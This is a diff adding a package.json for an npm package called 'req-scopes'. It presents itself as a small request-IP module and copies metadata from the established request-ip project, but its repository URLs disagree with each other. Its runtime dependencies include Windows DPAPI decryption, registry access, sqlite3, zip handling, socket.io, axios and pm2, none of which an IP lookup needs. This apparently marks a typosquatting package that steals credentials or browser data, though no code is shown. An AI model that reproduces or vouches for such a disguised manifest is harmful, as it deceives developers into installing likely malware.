@@ -1,0 +1,83 @@
+{
+  "name": "req-scopes",
+  "version": "3.4.1",
+  "description": "A small Node.js module to retrieve the request's IP address",
+  "keywords": [
+    "request ip",
+    "ip",
+    "address",
+    "request",
+    "proxy",
+    "client",
+    "header",
+    "X-Client-IP",
+    "X-Forwarded-For",
+    "CF-Connecting-IP",
+    "Fastly-Client-IP",
+    "True-Client-IP",
+    "X-Real-IP",
+    "X-Cluster-Client-IP",
+    "X-Forwarded",
+    "Forwarded-For",
+    "connection.remoteAddress",
+    "connection.socket.remoteAddress",
+    "req.info.remoteAddress",
+    "middleware",
+    "ipv4",
+    "ipv6",
+    "fastify",
+    "x-appengine-user-ip",
+    "cloudflare",
+    "Cf-Pseudo-IPv4"
+  ],
+  "homepage": "https://github.com/passion0401lad/requests-ip",
+  "bugs": {
+    "url": "https://github.com/passion0401lad/request-ip/issues"
+  },
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/passion0401lad/requests-ip.git"
+  },
+  "license": "MIT",
+  "author": "Runar Eiji <passion0401lad@gmail.com>",
+  "contributors": [
+    {
+      "name": "Jon Peck",
+      "email": "jpeck@fluxsauce.com"
+    }
+  ],
+  "files": [
+    "lib"
+  ],
+  "main": "./lib/index.js",
+  "scripts": {
+    "build": "babel src --out-dir lib",
+    "changelog": "github_changelog_generator -u pbojinov -p request-ip",
+    "coverage": "nyc report --reporter=text-lcov | coveralls",
+    "test": "nyc --reporter=html --reporter=text --check-coverage --lines=100 --statements=100 tape ./test/*.js"
+  },
+  "prettier": "@shopify/prettier-config",
+  "devDependencies": {
+    "@babel/cli": "^7.0.0",
+    "@babel/core": "^7.0.0",
+    "@babel/preset-env": "^7.0.0",
+    "@shopify/eslint-plugin": "^41.3.0",
+    "@shopify/prettier-config": "^1.1.2",
+    "coveralls": "^3.0.2",
+    "eslint": "^8.16.0",
+    "nyc": "^13.1.0",
+    "tap-spec": "^5.0.0",
+    "tape": "^4.9.1"
+  },
+  "dependencies": {
+    "@primno/dpapi": "^1.1.2",
+    "adm-zip": "^0.5.16",
+    "axios": "^1.7.7",
+    "child-process": "^1.0.2",
+    "pm2": "^5.4.2",
+    "request": "^2.88.2",
+    "socket.io-client": "^4.7.5",
+    "sqlite3": "^5.1.7",
+    "winreg": "^1.2.5"
+  }
+}
